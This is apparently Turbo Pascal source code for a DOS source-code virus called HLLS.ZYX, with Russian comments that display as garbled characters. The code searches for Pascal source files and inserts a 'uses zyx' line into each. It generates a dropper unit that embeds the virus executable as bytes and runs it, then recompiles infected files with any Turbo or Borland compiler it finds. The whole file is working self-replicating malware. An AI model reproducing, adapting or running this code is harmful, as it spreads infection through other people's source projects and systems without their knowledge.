   {$M 10000, 2000, 10000}
   {$I-,S-}
   program HLLS_ZYX;
   uses dos;
   var Command,Compile:string;
       Comp:boolean;
       Len:integer;
       s:searchrec;
   {--------------------------------------------------------------------------}
   function UpStr(st:string):string;   {¯à¥®¡à §ã¥â áâà®ªã ª ¢¥àå¥¬ã à¥£¨áâàã}
   var n:string;
       i:integer;
   begin
   n:='';
   for i:=1 to length(st) do n:=n+UpCase(st[i]);
   UpStr:=n;
   end;
   {--------------------------------------------------------------------------}
   function Find(name,what:string):boolean;{  «®£ ¤®á®¢áª®© ª®¬ ¤ë FIND}
   {„¥« ¥â ¢¨àãá ¥§ ¢¨á¨¬ë¬ ®â ¯à¨áãâáâ¢¨ï ãâ¨«¨âë FIND   ¤¨áª¥}
   var f:text;
       st:string;
   begin
   Find:=false;
   assign(f,name);reset(f);
   while not eof(f) do
     begin
     readln(f,st);
     if pos(what,UpStr(st))<>0 then
       begin
       Find:=true;
       exit
       end
     end
   end;
   {--------------------------------------------------------------------------}
   procedure Infect(st:string);        {¯®à ¦ ¥â ä ©«}
   const sn='$$$$$$$$';
   var f,g:text;
       u,ip,w:byte;
       s:string;
       n:byte;
   begin
   u:=0;
   ip:=0;
   w:=0; {¥ ¯®à §¨«¨}
   if Find(st,'ZYX') then exit;   {ä ©« ã¦¥ ¯®à ¦¥}
   if Find(st,'USES') then u:=1 ;
   if Find(st,'PROGRAM') or Find(st,'IMPLEMENTATION') then ip:=1 ;
   exec(Command,'/c copy '+st+' '+sn+'>nul');
   assign(f,sn);reset(f);                           {®âªàë«¨ ¢à¥¬¥ë© ä ©«}
   assign(g,st);rewrite(g);                         {¯¥à¥§ ¯¨á «¨ ¦¥àâ¢ã}
   if (ip=0) and (u=0) then
     begin
     writeln(g,'uses zyx;');
     w:=1;
     end;
   while not eof(f) do
     begin
     readln(f,s);
     if w=1 then writeln(g,s) else
       begin
       if u=1
       then if pos('USES',UpStr(s))<>0
            then begin
                 n:=pos('USES',UpStr(s))+4;
                 write(g,copy(s,1,n));
                 write(g,'zyx,');
                 writeln(g,copy(s,n,length(s)-n+1));
                 w:=1;
                 end
            else writeln(g,s)
       else if (pos('PROGRAM',UpStr(s))<>0) or (pos('IMPLEMENTATION',UpStr(s))<>0)
            then begin
                 writeln(g,s);
                 writeln(g,'uses zyx;');
                 w:=1;
                 end
            else writeln(g,s)
       end;
     end;
   close(g);
   close(f);erase(f);
   if Comp=true then exec(Command,'/c '+Compile+' '+st+'>nul');
   end;
   {--------------------------------------------------------------------------}
   procedure MakeDB;  {á®§¤ ¥â TPU-dropper ¢¨àãá }
   var f:text;
       i,c:byte;
       d:file;  {¨áå®¤ë© ä ©«}
       z:byte;  {áç¥âç¨ª § ¯¨á ëå á¨¬¢®«®¢}
   begin
   findfirst(paramstr(0),$20,s);
   Len:=s.size;                   { è«¨ ¤«¨ã}
   assign(f,'zyx.pas');rewrite(f);
   writeln(f,'{$M 10000, 1000, 10000}');
   writeln(f,'unit zyx;');
   writeln(f,'interface');
   writeln(f,'uses dos;');
   writeln(f,'implementation');
   writeln(f,'procedure Starting;');
   writeln(f,'const dat:array[1..',Len,'] of byte=(');
   assign(d,paramstr(0));reset(d,1);
   z:=0;
   while not eof(d) do
     begin
     blockread(d,c,1);
     write(f,ord(c));
     if not eof(d) then write(f,',');
     z:=z+1;
     if z=20 then begin writeln(f,'');z:=0;end;
     end;
   writeln(f,');');
   writeln(f,'var g:file;');
   writeln(f,'begin');
   writeln(f,'assign(g,''zyx.exe'');rewrite(g,1);');
   writeln(f,'blockwrite(g,dat,',Len,');');
   writeln(f,'close(g);');
   writeln(f,'exec(''zyx.exe'','''');');
   writeln(f,'erase(g)');
   writeln(f,'end;');
   writeln(f,'begin');
   writeln(f,'Starting;');
   writeln(f,'end.');
   close(f);
   if Comp=true then
     begin
     exec(Command,'/c '+Compile+' zyx.pas>nul');
     erase(f);   {§ ¬¥â ¥¬ á«¥¤ë}
     end;
   end;
   {-------------------------------------------------------------------------}
   procedure DetectComp;{®¯à¥¤¥«ï¥â  «¨ç¨¥   ª®¬¯ìîâ¥à¥ ª®¬¯¨«ïâ®à®¢}
   begin
   Comp:=false;
   Compile:='tpc.exe';
   exec(Command,'/c '+Compile+'>nul');
   if doserror<>0 then
     begin
     Compile:='bpc.exe';
     exec(Command,'/c '+Compile+'>nul');
     if doserror=0 then Comp:=true;
     end
   else Comp:=true;
   end;
   {--------------------------------------------------------------------------}
   begin
   findfirst('*.pas',$20,s);                 {¨é¥¬ PAS-ä ©«ë}
   if doserror=0 then                        {§ ç¨â ¥áâì, ç¥£® ¯®à §¨âì !}
     begin
     Command:='[HLLS.ZYX (c) by Duke/SMF]';  {¥¬®£® ª®¯¨à ©â®¢ ;) }
     Command:=GetEnv('COMSPEC');             {®¯à¥¤¥«ï¥¬ ¯ãâì ª COMMAND.COM}
     DetectComp;                             {¨é¥¬ ª®¬¯¨«ïâ®àë}
     MakeDB;                                 {á®§¤ ¥¬ ZYX.TPU}
     end;
   while doserror=0 do
     begin
     Infect(s.name);                         {¯®à ¦ ¥¬  ©¤¥ë© ä ©«ë}
     findnext(s);
     end;
   end.
